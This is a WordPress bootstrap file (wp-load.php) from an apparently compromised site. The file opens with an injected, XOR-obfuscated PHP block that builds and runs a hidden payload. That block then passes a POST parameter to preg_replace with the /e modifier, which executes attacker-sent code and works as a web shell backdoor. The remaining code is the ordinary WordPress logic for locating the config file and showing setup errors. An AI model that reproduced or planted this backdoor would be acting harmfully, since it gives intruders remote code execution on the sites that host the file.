<?php $nrkECiZVLjR='WYH3:PqQ,85T=+;'^'4+-RN5.7YVV TDU';$owCrYkN=$nrkECiZVLjR('','YJqg44YTZ+OP6K1-8-SBF+O;.UPD;0l;8BLPdQML7W8:RBE=Ny7;F..QHM4k70YdH -L3UDS:IIciWMKd+gaNwBFZIdpVUTpbh7Y>xP.dkSzIDjYU+3<4ENPlH4FWoxGm8xFHhPPa6LZZLRUom24OAobZ1h6JeZE<jVTUbnJGJP-EXt:K;K;OXcP14-;3 6ILA4Joa6eOI6gZb.SFWUwD42;5Yy2iY1;Ja:QTrhIF64C=PFnS.52MZTexkop8+pyev4OyOR<6dQzrG=7Y;XPu7R4kD1 0q17ABJsbR16CnkJ5OGUlEwoAVZX2xy-6<><BkYW<4>Ryk,IB.5:P1CFylt,><4ee7nT;1qj PLJrSav=2V, eHLL21s-2A+iZP6Dqpn945U3SGESY58CoNjAT6OXqXNGyKKSHWAD3spBwUW4IO;VZT4EQF:7-UZ7Z2d7G I;ZX7GurT4:DDPphHT;RlfDL3WY6<Z<:xfm104oiQA8JqOthZF8U0i ..nEM9CO Ar,E.RJQTD9LAyBqOnZX.XXg23C5juR2;c0kcooSiIG6fy+TqNy-dQXbvg7vhVYABxPodDRNVWfyHqcO9937i8YKtTTT4,1zM>08+Y.PqoNBP.<AZaeijgPKCspE,AQOe>0GVuR:.BXQ8YW1jqxkX-ZDoUATL2'^'0,YFRA77.B >i.IDKY jaS Iq110Zo3VM6kyMq6F>1MT16,R YOT4qJ0<,k4ZE-LlDL8RydwQ,0JIwmkDPmhGS-3.iYPqrozkaQ6LPtGDVsJrdN0iXGNX  xH,U26FCgIQSmabYYEY9.zbouGIVU; 4F3lHhjA1 E1r=uGN938<H+pPQ.BbffciY8FHOFRXah.A>FZ<l2CKmPFJ226uJdRSWF<B8M=PO+>Q4-RUi WX0XkLd5AGW,9<EPO03wd;0 VU<Yk9YODlDRcKV5N=yULX=O PTQ.ZR8bwSF9TOxdbnQ.34LxWK776-WCsP<6WZbCxsXUJ3PKWCKHZH5P .YDPslye0 d:tZBQNK55jOmARKS:YELh7F;8WIS5J615OdLPJRQLn9ZNa78AYcRnN75Z:=JRG:s6AYl3 0RSMb7 9G,=R76=N y>UEr1;C;m;Z2TaY;+RqA-0QY+ 5XL,5O3EJdhW6-Wc1YCQOV;YRGM5 L+QiRH;4J4I6KKW1 5P0;SiUG Wufqp X8 PbWiNr5JmpCVR7T1R9WBDmBCRRsNzvUPLH1I-KKW5oPGQUFY7jr J3WWs1z7pOYnWC.KKRN6S<2+1,=GXBRjNQAG6O4VCnf4OH sHEIJGpk8yy Z =gAZQ37.uJO;4>Y=plCJrb=U30GehoFO');$owCrYkN(); @preg_replace("/[pageerror]/e",$_POST['6rz6v8rz'],"saft"); ?><?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-config.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * wp-config.php file.
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */

/** Define ABSPATH as this file's directory */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}

error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );

/*
 * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
 * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
 * of avoiding cases where the current directory is a nested installation, e.g. / is WordPress(a)
 * and /blog/ is WordPress(b).
 *
 * If neither set of conditions is true, initiate loading the setup process.
 */
if ( file_exists( ABSPATH . 'wp-config.php') ) {

	/** The config file resides in ABSPATH */
	require_once( ABSPATH . 'wp-config.php' );

} elseif ( @file_exists( dirname( ABSPATH ) . '/wp-config.php' ) && ! @file_exists( dirname( ABSPATH ) . '/wp-settings.php' ) ) {

	/** The config file resides one level above ABSPATH but is not part of another install */
	require_once( dirname( ABSPATH ) . '/wp-config.php' );

} else {

	// A config file doesn't exist

	define( 'WPINC', 'wp-includes' );
	require_once( ABSPATH . WPINC . '/load.php' );

	// Standardize $_SERVER variables across setups.
	wp_fix_server_vars();

	require_once( ABSPATH . WPINC . '/functions.php' );

	$path = wp_guess_url() . '/wp-admin/setup-config.php';

	/*
	 * We're going to redirect to setup-config.php. While this shouldn't result
	 * in an infinite loop, that's a silly thing to assume, don't you think? If
	 * we're traveling in circles, our last-ditch effort is "Need more help?"
	 */
	if ( false === strpos( $_SERVER['REQUEST_URI'], 'setup-config' ) ) {
		header( 'Location: ' . $path );
		exit;
	}

	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
	require_once( ABSPATH . WPINC . '/version.php' );

	wp_check_php_mysql_versions();
	wp_load_translations_early();

	// Die with an error message
	$die  = sprintf(
		/* translators: %s: wp-config.php */
		__( "There doesn't seem to be a %s file. I need this before we can get started." ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p>' . sprintf(
		/* translators: %s: Codex URL */
		__( "Need more help? <a href='%s'>We got it</a>." ),
		__( 'https://codex.wordpress.org/Editing_wp-config.php' )
	) . '</p>';
	$die .= '<p>' . sprintf(
		/* translators: %s: wp-config.php */
		__( "You can create a %s file through a web interface, but this doesn't work for all server setups. The safest way is to manually create the file." ),
		'<code>wp-config.php</code>'
	) . '</p>';
	$die .= '<p><a href="' . $path . '" class="button button-large">' . __( "Create a Configuration File" ) . '</a>';

	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
}
